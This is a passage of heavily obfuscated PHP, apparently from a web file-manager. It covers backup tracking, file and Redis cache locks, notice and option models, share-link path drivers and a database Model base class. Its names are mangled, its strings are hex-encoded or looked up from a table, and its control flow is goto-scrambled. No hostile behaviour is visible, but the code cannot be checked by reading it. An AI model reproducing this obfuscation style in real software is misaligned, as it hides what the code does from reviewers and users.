$A¥”šºÃåí = $CÓ©‘Ò««Ô[$_SERVER[›é¼±][291]][$_SERVER[›é¼±][193]][$_SERVER[›é¼±][461]]; $D–Ü¡İã = array($_SERVER[›é¼±][462] => array($_SERVER[›é¼±][809], $A¥”šºÃåí), $_SERVER[›é¼±][810] => array($_SERVER[›é¼±][329], $CÓ©‘Ò««Ô[$_SERVER[›é¼±][747]])); goto eà–´Ë¾; eƒğ†¾¸™‹: $Cò°µµ×Æ = array($_SERVER[›é¼±][825] => 1, $_SERVER[›é¼±][490] => time(), $_SERVER[›é¼±][770] => 1, $_SERVER[›é¼±][822] => $A¥”šºÃåí, $_SERVER[›é¼±][814] => $B¨É‚†ó•â, $_SERVER[›é¼±][813] => $Eë£çÅ©¦Ç, $_SERVER[›é¼±][826] => time()); if ($c¿¬õìî½à) { $Cò°µµ×Æ[$_SERVER[›é¼±][823]] = $DÉß¬£éğÖ; $Cò°µµ×Æ[$_SERVER[›é¼±][824]] = $B‚Ì­àéÊÖ; } Backup::set($Cò°µµ×Æ); goto B¡š¤ÕË¸·; c˜‡ˆî¥Ş: $c­²Í¼æ­->task[$_SERVER[›é¼±][758]] = $B¨É‚†ó•â; $Cò°µµ×Æ = array($_SERVER[›é¼±][813] => $Eë£çÅ©¦Ç, $_SERVER[›é¼±][814] => $B¨É‚†ó•â, $_SERVER[›é¼±][815] => time()); Backup::set($Cò°µµ×Æ); goto BÁ”áæñš¸; C£ÎóÇÈà: $DˆöÆôÒÔÑ = 1000; $aÙ£Å¯¯Ğ = $c¿¬õìî½à = 0; $Bæ°êäšØ = array(); goto Dá«¶ã•á; B¡š¤ÕË¸·: $this->_fileFilter($Bæ°êäšØ); return !0; goto CéÔŞç‡àˆ; eà–´Ë¾: $Eë£çÅ©¦Ç = (int) Model($_SERVER[›é¼±][782])->where($D–Ü¡İã)->count($_SERVER[›é¼±][461]); $B¨É‚†ó•â = (int) Model($_SERVER[›é¼±][782])->where($D–Ü¡İã)->sum($_SERVER[›é¼±][78]); $c­²Í¼æ­ = new TaskFileTransfer($_SERVER[›é¼±][811], $_SERVER[›é¼±][777], $Eë£çÅ©¦Ç, LNG($_SERVER[›é¼±][778]) . $_SERVER[›é¼±][779] . LNG($_SERVER[›é¼±][812])); goto c˜‡ˆî¥Ş; CéÔŞç‡àˆ: } private function _fileExist($b­©Á ¤ÁÀ, &$eƒÎÊñÕ®±, $aÌùäé°ì) { goto bªÂ‚Õ«°; A¸‰¥®ÕóÍ: if (!in_array($b­©Á ¤ÁÀ[$eŠÃà¶ò®Ÿ[819]], $aÌùäé°ì)) { return !1; } if (IO::exist($E­±Í´ò )) { return !0; } $D¯®ÕéÅØ¿ = get_path_father($E­±Í´ò ); goto dÃÙ¸¥ä‚; d¥‹«‡ŞƒÚ: $eƒÎÊñÕ®± = array_merge($eƒÎÊñÕ®±, array_to_keyvalue($f“ƒìí·, $eŠÃà¶ò®Ÿ[33], $eŠÃà¶ò®Ÿ[461])); return !1; goto c£³¤¡šÕ; dÃÙ¸¥ä‚: if (IO::exist($D¯®ÕéÅØ¿)) { $eƒÎÊñÕ®±[] = $b­©Á ¤ÁÀ[$eŠÃà¶ò®Ÿ[461]]; return !1; } $F¿¹ÓÔ‡¶ó = array($eŠÃà¶ò®Ÿ[819] => $b­©Á ¤ÁÀ[$eŠÃà¶ò®Ÿ[819]], $eŠÃà¶ò®Ÿ[76] => array($eŠÃà¶ò®Ÿ[381], "{$D¯®ÕéÅØ¿}\x25")); $f“ƒìí· = Model($eŠÃà¶ò®Ÿ[782])->where($F¿¹ÓÔ‡¶ó)->field($eŠÃà¶ò®Ÿ[462])->select(); goto d¥‹«‡ŞƒÚ; bªÂ‚Õ«°: $eŠÃà¶ò®Ÿ =& $_SERVER[›é¼±]; $E­±Í´ò  = $b­©Á ¤ÁÀ[$eŠÃà¶ò®Ÿ[76]]; if (in_array($b­©Á ¤ÁÀ[$eŠÃà¶ò®Ÿ[461]], $eƒÎÊñÕ®±)) { return !1; } goto A¸‰¥®ÕóÍ; c£³¤¡šÕ: } private function _fileFilter($c¦ÀÃÏŠ í) { $cÖÊ¼â»Œ =& $_SERVER[›é¼±]; if (empty($c¦ÀÃÏŠ í)) { return; } $DªŒç²‘· = array($cÖÊ¼â»Œ[461] => array($cÖÊ¼â»Œ[7], array_unique($c¦ÀÃÏŠ í))); $a£„ï—ƒ„‡ = Model($cÖÊ¼â»Œ[827])->where($DªŒç²‘·)->field($cÖÊ¼â»Œ[397])->select(); foreach ($a£„ï—ƒ„‡ as $BàáÁ‡‘‡) { Model($cÖÊ¼â»Œ[827])->remove($BàáÁ‡‘‡[$cÖÊ¼â»Œ[397]], !1); } } private function storeIds() { $AÔŠáÓŒ÷ =& $_SERVER[›é¼±]; $B™õ‰ñí¬‚ = Model($AÔŠáÓŒ÷[762])->listData(); $Aøêõ‰áÔ = array(); $bæÊ•Øğã = $GLOBALS[$AÔŠáÓŒ÷[6]][$AÔŠáÓŒ÷[88]][$AÔŠáÓŒ÷[828]]; foreach ($B™õ‰ñí¬‚ as $cÜÉ»’êîæ) { $E£ Æ èÍØ = strtolower($cÜÉ»’êîæ[$AÔŠáÓŒ÷[94]]); if (!isset($bæÊ•Øğã[$E£ Æ èÍØ])) { continue; } $E¤µ–Ù•¼ª = $AÔŠáÓŒ÷[72] . (isset($bæÊ•Øğã[$E£ Æ èÍØ]) ? $bæÊ•Øğã[$E£ Æ èÍØ] : ucfirst($E£ Æ èÍØ)); if (!class_exists($E¤µ–Ù•¼ª)) { continue; } $Aøêõ‰áÔ[] = $cÜÉ»’êîæ[$AÔŠáÓŒ÷[395]]; } return $Aøêõ‰áÔ; } } goto Aø„Â¦ßÁ¸; b¡ù„ö®ùå: function cacheLockWait() { usleep(mt_rand(200, 5000)); } class CacheLockFile { private static $cachePath; private static $caches; public function __construct() { $CÖÜİ¦Î  =& $_SERVER[›é¼±]; $eâ‹“æº = $GLOBALS[$CÖÜİ¦Î [6]][$CÖÜİ¦Î [347]]; self::$cachePath = $eâ‹“æº[$CÖÜİ¦Î [193]][$CÖÜİ¦Î [76]]; @mkdir(self::$cachePath, DEFAULT_PERRMISSIONS, !0); } public function lock($D‹£Æóâæ–, $Cœ×Á¾ÑÃÔ = 0) { goto aÆÛ”ˆÌ‚¯; aÆÛ”ˆÌ‚¯: $FìåîÄ•” =& $_SERVER[›é¼±]; $b…‚¤Ü‡á = microtime(!0); $b¶©‘¬Ğ„æ = $b…‚¤Ü‡á + $Cœ×Á¾ÑÃÔ + 0.0001; goto dÖË‡¿¾Ù•; BÇ‹Ùøª‘: $this->unlock($D‹£Æóâæ–); return !1; goto e¹¬˜¬ùÑ¨; dÖË‡¿¾Ù•: $F‡òô‘È’ = rtrim(self::$cachePath, $FìåîÄ•”[8]) . $FìåîÄ•”[855] . md5($D‹£Æóâæ–) . $FìåîÄ•”[852]; if (file_exists($F‡òô‘È’) && filemtime($F‡òô‘È’) && filemtime($F‡òô‘È’) < time() - 10) { @unlink($F‡òô‘È’); } do { if (file_exists($F‡òô‘È’)) { cacheLockWait(); continue; } $cùÍ‰‚³ê = fopen($F‡òô‘È’, $FìåîÄ•”[856]); if (!$cùÍ‰‚³ê) { return !1; } $C“øô›Šß = flock($cùÍ‰‚³ê, LOCK_EX | LOCK_NB); self::$caches[$D‹£Æóâæ–] = array($FìåîÄ•”[857] => $cùÍ‰‚³ê, $FìåîÄ•”[193] => $F‡òô‘È’); fwrite($cùÍ‰‚³ê, $b¶©‘¬Ğ„æ); clearstatcache(); if ($cùÍ‰‚³ê && $C“øô›Šß) { return !0; } cacheLockWait(); } while (microtime(!0) < $b¶©‘¬Ğ„æ); goto BÇ‹Ùøª‘; e¹¬˜¬ùÑ¨: } public function lockGet($A“èõİŒ•) { $FóÎïˆ¤Éâ =& $_SERVER[›é¼±]; $Eíà¬Ã±Çù = rtrim(self::$cachePath, $FóÎïˆ¤Éâ[8]) . $FóÎïˆ¤Éâ[855] . md5($A“èõİŒ•) . $FóÎïˆ¤Éâ[852]; return file_exists($Eíà¬Ã±Çù); } public function unlock($d¶¹àƒ¢°™) { goto a¼Ÿ–çœ¤; a¼Ÿ–çœ¤: $D±§•Ä¸ó =& $_SERVER[›é¼±]; $eª‘¼Ì’Ü = self::$caches[$d¶¹àƒ¢°™]; if (!$eª‘¼Ì’Ü) { return; } goto fçëˆšËĞñ; AÍğ®µë÷Ú: unset(self::$caches[$d¶¹àƒ¢°™]); goto a¶Œßå¶¯; fçëˆšËĞñ: @flock($eª‘¼Ì’Ü[$D±§•Ä¸ó[857]], LOCK_UN); @fclose($eª‘¼Ì’Ü[$D±§•Ä¸ó[857]]); @unlink($eª‘¼Ì’Ü[$D±§•Ä¸ó[193]]); goto AÍğ®µë÷Ú; a¶Œßå¶¯: } } class CacheLockRedis { public function lock($aËë÷ã‹, $D¢¦×©¤÷µ = 10) { $BõÒî…ƒÔƒ = Cache::init(); $fÃåĞ–¦Œ„ = microtime(!0) + $D¢¦×©¤÷µ; while (microtime(!0) < $fÃåĞ–¦Œ„) { $d’·½±è° = $BõÒî…ƒÔƒ->get($aËë÷ã‹); if (!$d’·½±è°) { $E¾µ½·á¿í = $BõÒî…ƒÔƒ->setLock($aËë÷ã‹, $fÃåĞ–¦Œ„, $D¢¦×©¤÷µ); if ($E¾µ½·á¿í) { return !0; } } else { if ($d’·½±è° < microtime(!0)) { $BõÒî…ƒÔƒ->set($aËë÷ã‹, $fÃåĞ–¦Œ„, $D¢¦×©¤÷µ * 2); if ($BõÒî…ƒÔƒ->get($aËë÷ã‹) === $d’·½±è°) { return !0; } } } cacheLockWait(); } return !1; } public function lockGet($F»•æå¦–) { return Cache::init()->get($F»•æå¦–); } public function unlock($dÁµ¤‚Ó˜¬) { return Cache::init()->remove($dÁµ¤‚Ó˜¬); } } goto eä áÇ‹·¾; B×œ“¬™±: class SystemNoticeModel extends ModelBaseLight { public $optionType = "\123\x79\x73\164\x65\155\x2e\x6e\157\164\151\143\145\x4c\151\163\164"; public $field = array("\x6e\141\155\x65", "\x63\x6f\156\164\x65\x6e\164", "\x61\x75\164\x68", "\155\157\144\145", "\164\151\x6d\145", "\164\x79\x70\x65", "\x6c\145\x76\145\154", "\145\x6e\141\142\x6c\145", "\x73\157\162\x74"); public function listData($D‹¬ö†ˆ­ª = false, $Eˆ‘Òâ‚í = "\163\157\162\164", $fëÎÚ†‹¤¯ = false) { return parent::listData($D‹¬ö†ˆ­ª, $Eˆ‘Òâ‚í, $fëÎÚ†‹¤¯); } public function add($fàŒ‚í„ñÔ) { $BÄçº¡¨ìÅ =& $_SERVER[›é¼±]; $D…“£èÉí³ = time(); if ($fàŒ‚í„ñÔ[$BÄçº¡¨ìÅ[12]] == $BÄçº¡¨ìÅ[2143]) { $D…“£èÉí³ = strtotime($fàŒ‚í„ñÔ[$BÄçº¡¨ìÅ[197]]); } $fàŒ‚í„ñÔ[$BÄçº¡¨ìÅ[197]] = $D…“£èÉí³; return parent::insert($fàŒ‚í„ñÔ); } public function update($f÷«—æ±ÒŒ, $A‰«ŠÏÓ») { goto cˆõóÚÖ‘©; fÄó‹ö˜§ß: $cÉá …„ª = time(); if ($A‰«ŠÏÓ»[$C´‘°îÍ÷[12]] == $C´‘°îÍ÷[2143]) { $cÉá …„ª = strtotime($A‰«ŠÏÓ»[$C´‘°îÍ÷[197]]); } $A‰«ŠÏÓ»[$C´‘°îÍ÷[197]] = $cÉá …„ª; goto Bî‡íæÈ÷; Bî‡íæÈ÷: return parent::update($f÷«—æ±ÒŒ, $A‰«ŠÏÓ»); goto E·™ÄİñíÛ; cˆõóÚÖ‘©: $C´‘°îÍ÷ =& $_SERVER[›é¼±]; $Fã‰³Õ•¯â = $this->listData($f÷«—æ±ÒŒ); if (!$Fã‰³Õ•¯â) { return !1; } goto fÄó‹ö˜§ß; E·™ÄİñíÛ: } public function remove($Eìêô‹†Ôğ) { $C°ã™Š¯œ = $this->listData($Eìêô‹†Ôğ); if (!$C°ã™Š¯œ || $C°ã™Š¯œ[$_SERVER[›é¼±][1204]]) { return !1; } return parent::remove($Eìêô‹†Ôğ); } public function sort($a·¯Õ‰ê–‹, $eŞºÍñÈƒ¦) { return parent::update($a·¯Õ‰ê–‹, $eŞºÍñÈƒ¦); } public function enable($DøÌóÀ‡Ù, $d­œÜíƒ¼í) { return parent::update($DøÌóÀ‡Ù, array($_SERVER[›é¼±][2144] => $d­œÜíƒ¼í)); } private function initUserOption() { $Eê…÷‘ùˆ =& $_SERVER[›é¼±]; $this->optionType = $Eê…÷‘ùˆ[2145]; $this->modelType = $Eê…÷‘ùˆ[2146]; $this->field = array($Eê…÷‘ùˆ[2147], $Eê…÷‘ùˆ[28], $Eê…÷‘ùˆ[197], $Eê…÷‘ùˆ[29], $Eê…÷‘ùˆ[2148], $Eê…÷‘ùˆ[745], $Eê…÷‘ùˆ[189]); } public function userNoticeGet($eñôÒÓÄ†À = false) { $this->initUserOption(); return parent::listData($eñôÒÓÄ†À, $_SERVER[›é¼±][395], !0); } public function userNoticeAdd($D›§è“´˜) { $Côì ¤Œ°¦ =& $_SERVER[›é¼±]; $this->initUserOption(); $dÍŒİÕÑ = $this->findByKey($Côì ¤Œ°¦[2147], $D›§è“´˜[$Côì ¤Œ°¦[395]]); if ($dÍŒİÕÑ) { return !0; } $Fò¹Ü”„Ğ† = array($Côì ¤Œ°¦[2147] => $D›§è“´˜[$Côì ¤Œ°¦[395]], $Côì ¤Œ°¦[28] => $D›§è“´˜[$Côì ¤Œ°¦[28]], $Côì ¤Œ°¦[197] => $D›§è“´˜[$Côì ¤Œ°¦[197]], $Côì ¤Œ°¦[29] => isset($D›§è“´˜[$Côì ¤Œ°¦[29]]) ? $D›§è“´˜[$Côì ¤Œ°¦[29]] : 1, $Côì ¤Œ°¦[2148] => isset($D›§è“´˜[$Côì ¤Œ°¦[2148]]) ? $D›§è“´˜[$Côì ¤Œ°¦[2148]] : 0, $Côì ¤Œ°¦[745] => 0, $Côì ¤Œ°¦[189] => 0); return parent::insert($Fò¹Ü”„Ğ†); } public function userNoticeEdit($f¤»àÀ‰×, $fßì‡µÍ¼›) { $this->initUserOption(); return parent::update($f¤»àÀ‰×, $fßì‡µÍ¼›); } } class SystemOptionModel extends ModelBaseOption { protected $tableName = "\163\x79\x73\x74\145\155\137\x6f\160\x74\151\157\x6e"; protected $jsonField = array("\x6d\145\x6e\x75", "\x72\157\154\x65", "\162\157\x6c\145\107\x72\157\x75\160", "\x72\145\x67\151\163\x74", "\145\155\x61\x69\154"); function __construct() { parent::__construct(); } protected function cacheKey($B½ƒ¯ÀÆ°) { return "\x53\x79\x73\164\145\x6d\117\x70\x74\151\x6f\156\137{$B½ƒ¯ÀÆ°}"; } protected function optionDefault($A´ ›è´¥ = '') { $e†Â²ÂİÈù =& $_SERVER[›é¼±]; if ($A´ ›è´¥ == $e†Â²ÂİÈù[33]) { return $GLOBALS[$e†Â²ÂİÈù[6]][$e†Â²ÂİÈù[379]]; } } } class SystemRecordModel extends ModelBaseLight { } goto fÔ™É¤˜‹; AÓŠ—½ÖŒº: class PathDriverDriverShareItem { public function __construct($dï×÷§–à—) { $this->pathParse = $dï×÷§–à—; } public function __call($FÑ§ì˜¬®×, $AöİÍ¿ä§) { $AŒŠ÷˜ñùŠ =& $_SERVER[›é¼±]; if (method_exists($this, $FÑ§ì˜¬®×)) { return; } $dŠ›ùŠ = call_user_func_array(array($AŒŠ÷˜ñùŠ[1248], $FÑ§ì˜¬®×), $AöİÍ¿ä§); $eÕ†¬õ“Ö§ = array($AŒŠ÷˜ñùŠ[1249], $AŒŠ÷˜ñùŠ[1250], $AŒŠ÷˜ñùŠ[1251], $AŒŠ÷˜ñùŠ[1252], $AŒŠ÷˜ñùŠ[543], $AŒŠ÷˜ñùŠ[545], $AŒŠ÷˜ñùŠ[1253], $AŒŠ÷˜ñùŠ[107], $AŒŠ÷˜ñùŠ[1254], $AŒŠ÷˜ñùŠ[1255]); if (in_array($FÑ§ì˜¬®×, $eÕ†¬õ“Ö§)) { $dŠ›ùŠ = $this->getPathOuter($dŠ›ùŠ); } return $dŠ›ùŠ; } public function copy($c‰ÁÄà‚¤ò, $bÙì†˜¿Í£, $AÉ‚¤™ä = false) { return $this->copyMove($c‰ÁÄà‚¤ò, $bÙì†˜¿Í£, $AÉ‚¤™ä, $_SERVER[›é¼±][543]); } public function move($DÉ™‡Ò¡õ, $CŠˆòùßª, $F®÷â˜‰ƒ = false) { return $this->copyMove($DÉ™‡Ò¡õ, $CŠˆòùßª, $F®÷â˜‰ƒ, $_SERVER[›é¼±][545]); } private function copyMove($A©ãß„“êŒ, $c©–«…´½, $Aå¹¿«İÅÛ, $Bš±×ÀŒÜî) { goto a²´–ÁÄ‡; a²´–ÁÄ‡: $fºğÂİ¥´ª =& $_SERVER[›é¼±]; $C‡‘±—¸æ = $c©–«…´½; $E‡„²¯†¸Œ = IO::driverMake($c©–«…´½); goto DìÀ°ÄÁ¸; bˆ¢Ü¯š¹: return $FÚÜÕ×”Öš; goto F¿ŞÂ¡¨Øø; DìÀ°ÄÁ¸: if ($E‡„²¯†¸Œ->pathParse[$fºğÂİ¥´ª[1081]]) { $c©–«…´½ = $E‡„²¯†¸Œ->pathParse[$fºğÂİ¥´ª[1081]]; } else { $c©–«…´½ = $C‡‘±—¸æ; } $FÚÜÕ×”Öš = IO::copyMove($A©ãß„“êŒ, $c©–«…´½, $Aå¹¿«İÅÛ, $Bš±×ÀŒÜî); $FÚÜÕ×”Öš = $this->getPathOuter($FÚÜÕ×”Öš); goto bˆ¢Ü¯š¹; F¿ŞÂ¡¨Øø: } public function pathThis($A´ğ‘×§ÅÛ) { return get_path_this($this->pathParse[$_SERVER[›é¼±][76]]); } public function pathFather($fŞÍ¡é¤‰) { return get_path_father($this->pathParse[$_SERVER[›é¼±][76]]); } public function iconvSystem($CÆ½©à…Ï½) { return $CÆ½©à…Ï½; } protected function infoParse($e©Å™ô¬Ø—, $BêÄë›ªÆâ = false) { $Eº÷µˆ˜ =& $_SERVER[›é¼±]; $F¹­ßæ›±è = $this->pathParse[$Eº÷µˆ˜[480]][$Eº÷µˆ˜[1104]] . $this->pathParse[$Eº÷µˆ˜[1097]]; if ($BêÄë›ªÆâ) { $dÁÆã†¥¶¡ = IO::infoWithChildren($F¹­ßæ›±è); } else { $dÁÆã†¥¶¡ = IO::info($F¹­ßæ›±è); } $cÍ“çÖöÜ² = $this->pathParse[$Eº÷µˆ˜[480]]; return Action($Eº÷µˆ˜[1247])->_shareItemeParse($dÁÆã†¥¶¡, $cÍ“çÖöÜ²); } public function listAll($bªäÛõŸÎ¯) { $FÒ‘šº»¾‰ =& $_SERVER[›é¼±]; $cÂ®Ÿ–Í¶ = IO::listAll($bªäÛõŸÎ¯); $CÀŒ‘áôÉ¡ = $this->pathParse[$FÒ‘šº»¾‰[480]]; foreach ($cÂ®Ÿ–Í¶ as &$f´Ù½å…ßÂ) { check_abort(); $eîÕ³‹İÚ© = IO::info($f´Ù½å…ßÂ[$FÒ‘šº»¾‰[76]]); $eîÕ³‹İÚ© = is_array($eîÕ³‹İÚ©) ? $eîÕ³‹İÚ© : array(); $f´Ù½å…ßÂ = array_merge($eîÕ³‹İÚ©, $f´Ù½å…ßÂ); $f´Ù½å…ßÂ[$FÒ‘šº»¾‰[85]] = Action($FÒ‘šº»¾‰[1247])->_shareItemeParse($f´Ù½å…ßÂ, $CÀŒ‘áôÉ¡); } unset($f´Ù½å…ßÂ); return $cÂ®Ÿ–Í¶; } public function getPathOuter($bÇÌ´ÉÚõ¦) { goto FÇ‘ˆŞ˜ÓÓ; c¦ñßŞ»©: if (substr($C¨ğ¿±¯¸Ë, 0, strlen($a‡÷Êë°ô)) != $a‡÷Êë°ô) { return !1; } return $this->pathParse[$aİĞô„“ï[1098]] . $aİĞô„“ï[8] . ltrim($dººŠÏö—‚, $aİĞô„“ï[8]); goto cÔù•êÅÌ; FÇ‘ˆŞ˜ÓÓ: $aİĞô„“ï =& $_SERVER[›é¼±]; $AÄª¿Æ = KodIO::parse($bÇÌ´ÉÚõ¦); if ($AÄª¿Æ[$aİĞô„“ï[29]] == KodIO::KOD_SHARE_ITEM) { return $AÄª¿Æ[$aİĞô„“ï[76]]; } goto CËâ‡é‚ëß; CËâ‡é‚ëß: $C¨ğ¿±¯¸Ë = KodIO::clear($bÇÌ´ÉÚõ¦); $a‡÷Êë°ô = KodIO::clear($this->pathParse[$aİĞô„“ï[480]][$aİĞô„“ï[1104]]); $dººŠÏö—‚ = substr($C¨ğ¿±¯¸Ë, strlen($a‡÷Êë°ô)); goto c¦ñßŞ»©; cÔù•êÅÌ: } public function getType() { $AäÈª´¥ =& $_SERVER[›é¼±]; $Dƒ‰îÄ“ˆĞ = str_replace($AäÈª´¥[72], $AäÈª´¥[33], get_class($this)); return strtolower($Dƒ‰îÄ“ˆĞ); } public function isTypeObject($F«•ˆ°¯‰) { return IO::isTypeObject($F«•ˆ°¯‰); } public function info($B¹Ãƒóè•Ø) { return $this->infoParse($B¹Ãƒóè•Ø); } public function infoAuth($c­‡×ÛòØ) { return $this->infoParse($c­‡×ÛòØ); } public function infoWithChildren($cåÔ©÷³®») { return $this->infoParse($cåÔ©÷³®», !0); } public function infoFull($BÇÉíÖÊø) { return $this->infoParse($BÇÉíÖÊø); } } class PathDriverDriverShareLink extends PathDriverDriverShareItem { public function __construct($EÕ‹ˆùµÕİ) { $this->pathParse = $EÕ‹ˆùµÕİ; } protected function infoParse($D—ïœµß“¢, $B‘ÒÄğÕƒŠ = false) { $bĞ–ÛÉæº¸ =& $_SERVER[›é¼±]; return Action($bĞ–ÛÉæº¸[1103])->sharePathInfo($this->pathParse[$bĞ–ÛÉæº¸[76]], !0, $B‘ÒÄğÕƒŠ); } public function listPath($a³©­àÑ›Ì, $d‘Ü¿³‘ = false) { $BšÔ¼¯á =& $_SERVER[›é¼±]; $e¿ã¨®Ÿ¬Ÿ = IO::listPath($a³©­àÑ›Ì, $d‘Ü¿³‘); foreach ($e¿ã¨®Ÿ¬Ÿ as $AŒÚª¨„à => $C¼çÊ´Äë) { if (!in_array($AŒÚª¨„à, array($BšÔ¼¯á[74], $BšÔ¼¯á[75]))) { continue; } foreach ($C¼çÊ´Äë as $CÎ±óĞˆÚ => $D¬İ¼¢¡Ù) { $D¬İ¼¢¡Ù = Action($BšÔ¼¯á[1256])->parsePathChildren($D¬İ¼¢¡Ù, array($BšÔ¼¯á[416] => $a³©­àÑ›Ì)); $e¿ã¨®Ÿ¬Ÿ[$AŒÚª¨„à][$CÎ±óĞˆÚ] = Action($BšÔ¼¯á[1103])->shareItemInfo($D¬İ¼¢¡Ù); } } return $e¿ã¨®Ÿ¬Ÿ; } public function listAll($b­ì…œ‡İ) { $Eï†áãßÑõ =& $_SERVER[›é¼±]; $E¿Û†¨­Œ = IO::listAll($b­ì…œ‡İ); foreach ($E¿Û†¨­Œ as &$A‘µĞÍ¬Ò‹) { $FÙä¨’÷ò¢ = IO::info($A‘µĞÍ¬Ò‹[$Eï†áãßÑõ[76]]); $FÙä¨’÷ò¢ = is_array($FÙä¨’÷ò¢) ? $FÙä¨’÷ò¢ : array(); $A‘µĞÍ¬Ò‹ = array_merge($FÙä¨’÷ò¢, $A‘µĞÍ¬Ò‹); $A‘µĞÍ¬Ò‹[$Eï†áãßÑõ[85]] = Action($Eï†áãßÑõ[1103])->shareItemInfo($A‘µĞÍ¬Ò‹); } unset($A‘µĞÍ¬Ò‹); return $E¿Û†¨­Œ; } } class PathDriverEDS extends PathDriverMinIO { public function __construct($DùØºò”ŞÄ) { parent::__construct($DùØºò”ŞÄ); } } goto f‹›İíËŞ; f‹ôÒ¹ñïè: define($_SERVER[›é¼±][240], 0); define($_SERVER[›é¼±][241], 2); class Model extends ClassBaseCall { private $_extModel = null; protected $db = null; protected $pk = "\151\x64"; protected $tablePrefix = ''; protected $name = ''; protected $dbName = ''; protected $connection = ''; protected $tableName = ''; protected $trueTableName = ''; protected $error = ''; protected $fields = array(); protected $data = array(); protected $options = array(); protected $_validate = array(); protected $_auto = array(); protected $_map = array(); protected $_scope = array(); protected $autoCheckFields = true; protected $patchValidate = false; protected $methods = array("\164\141\142\x6c\145", "\x6f\162\144\x65\x72", "\x61\154\151\x61\163", "\150\x61\x76\x69\x6e\x67", "\x67\x72\157\165\x70", "\154\157\143\153", "\x64\151\x73\164\151\x6e\143\164", "\x61\165\x74\x6f", "\146\x69\154\164\145\162", "\x76\x61\154\x69\x64\141\164\x65", "\162\x65\163\165\x6c\164", "\142\151\x6e\x64", "\164\x6f\x6b\145\x6e"); public function __construct($b™ìˆƒ—’½ = '', $d†­×½‰ò = '', $BŸöé×ºß‹ = '') { $bó”Îâœî =& $_SERVER[›é¼±]; $this->_initialize(); if (!empty($b™ìˆƒ—’½)) { if (strpos($b™ìˆƒ—’½, $bó”Îâœî[95])) { list($this->dbName, $this->name) = explode($bó”Îâœî[95], $b™ìˆƒ—’½); } else { $this->name = $b™ìˆƒ—’½; } } elseif (empty($this->name)) { $this->name = $this->getModelName(); } if (is_null($d†­×½‰ò)) { $this->tablePrefix = $bó”Îâœî[33]; } elseif ($bó”Îâœî[33] != $d†­×½‰ò) { $this->tablePrefix = $d†­×½‰ò; } else { $this->tablePrefix = $this->tablePrefix ? $this->tablePrefix : think_config($bó”Îâœî[242]); } $this->db(0, empty($this->connection) ? $BŸöé×ºß‹ : $this->connection); $this->_classObjectID = mt_rand(0, 10000); } protected function _checkTableInfo() { $fÃÔùô—†÷ =& $_SERVER[›é¼±]; if (empty($this->fields)) { if (think_config($fÃÔùô—†÷[243])) { $Câ«Ò²éœ = $this->dbName ? $this->dbName : think_config($fÃÔùô—†÷[244]); $BÌ…êÖª©Ã = think_var_cache($fÃÔùô—†÷[245] . strtolower(get_path_this($Câ«Ò²éœ) . $fÃÔùô—†÷[95] . $this->name)); if ($BÌ…êÖª©Ã) { $aîÍ‘ ï÷ = think_config($fÃÔùô—†÷[246]); if (empty($aîÍ‘ ï÷) || $BÌ…êÖª©Ã[$fÃÔùô—†÷[247]] == $aîÍ‘ ï÷) { $this->fields = $BÌ…êÖª©Ã; return; } } } $this->flush(); } } public function flush() { goto C¬‡¶Ö‘õ’; aÖ¶¨ä´ÛŸ: foreach ($b¤È……á›Â as $FêšÊŒç‹¤ => $d«ÅŸÂå¥) { $dà¾³®ËŒ[$FêšÊŒç‹¤] = $d«ÅŸÂå¥[$BÖ‘ÄôŒ›Ş[29]]; if ($d«ÅŸÂå¥[$BÖ‘ÄôŒ›Ş[36]]) { $this->fields[$BÖ‘ÄôŒ›Ş[249]] = $FêšÊŒç‹¤; if ($d«ÅŸÂå¥[$BÖ‘ÄôŒ›Ş[39]]) { $this->fields[$BÖ‘ÄôŒ›Ş[248]] = !0; } } } $this->fields[$BÖ‘ÄôŒ›Ş[250]] = $dà¾³®ËŒ; if (think_config($BÖ‘ÄôŒ›Ş[246])) { $this->fields[$BÖ‘ÄôŒ›Ş[247]] = think_config($BÖ‘ÄôŒ›Ş[246]); } goto fÓòïª¬ŞÉ; C¬‡¶Ö‘õ’: $BÖ‘ÄôŒ›Ş =& $_SERVER[›é¼±]; $this->db->setModel($this->name); $b¤È……á›Â = $this->db->getFields($this->getTableName()); goto c¾¢ê»êÃ; c¾¢ê»êÃ: if (!$b¤È……á›Â) { return !1; } $this->fields = array_keys($b¤È……á›Â); $this->fields[$BÖ‘ÄôŒ›Ş[248]] = !1; goto aÖ¶¨ä´ÛŸ; fÓòïª¬ŞÉ: if (think_config($BÖ‘ÄôŒ›Ş[243])) { $b‰ŠøÇ¬ˆ = $this->dbName ? $this->dbName : think_config($BÖ‘ÄôŒ›Ş[244]); think_var_cache($BÖ‘ÄôŒ›Ş[245] . strtolower(get_path_this($b‰ŠøÇ¬ˆ) . $BÖ‘ÄôŒ›Ş[95] . $this->name), $this->fields); } goto a¦‘¨‹‚«; a¦‘¨‹‚«: } public function switchModel($A•†–à­Õ©, $DÖ†öœÀÂŒ = array()) { $bŞ¹Œ»ññî =& $_SERVER[›é¼±]; $A¿•Ñ¿®õ = ucwords(strtolower($A•†–à­Õ©)) . $bŞ¹Œ»ññî[251]; if (!class_exists($A¿•Ñ¿®õ)) { think_exception($A¿•Ñ¿®õ . think_lang($bŞ¹Œ»ññî[252])); } $this->_extModel = new $A¿•Ñ¿®õ($this->name); if (!empty($DÖ†öœÀÂŒ)) { foreach ($DÖ†öœÀÂŒ as $dŞÔ¦°½ä) { $this->_extModel->setProperty($dŞÔ¦°½ä, $this->{$dŞÔ¦°½ä}); } } return $this->_extModel; } public function __set($AõçàğøŒ¯, $c¶Š÷½ˆ´­) { $this->data[$AõçàğøŒ¯] = $c¶Š÷½ˆ´­; } public function __get($F¡Œ°¤¥Ë) { return isset($this->data[$F¡Œ°¤¥Ë]) ? $this->data[$F¡Œ°¤¥Ë] : null; } public function __isset($B’í”Æ‹ˆê) { return isset($this->data[$B’í”Æ‹ˆê]); } public function __unset($F…ùæˆ²õ) { unset($this->data[$F…ùæˆ²õ]); } public function __call($AÀ–…Ö›Øæ, $AëĞ‘•Ì•¶) { $b’µºÚ³¹‡ =& $_SERVER[›é¼±]; if (in_array(strtolower($AÀ–…Ö›Øæ), $this->methods, !0)) { $this->options[strtolower($AÀ–…Ö›Øæ)] = $AëĞ‘•Ì•¶[0]; return $this; } elseif (in_array(strtolower($AÀ–…Ö›Øæ), array($b’µºÚ³¹‡[253], $b’µºÚ³¹‡[254], $b’µºÚ³¹‡[255], $b’µºÚ³¹‡[256], $b’µºÚ³¹‡[257]), !0)) { $Fäš‡Âæî = isset($AëĞ‘•Ì•¶[0]) ? $AëĞ‘•Ì•¶[0] : 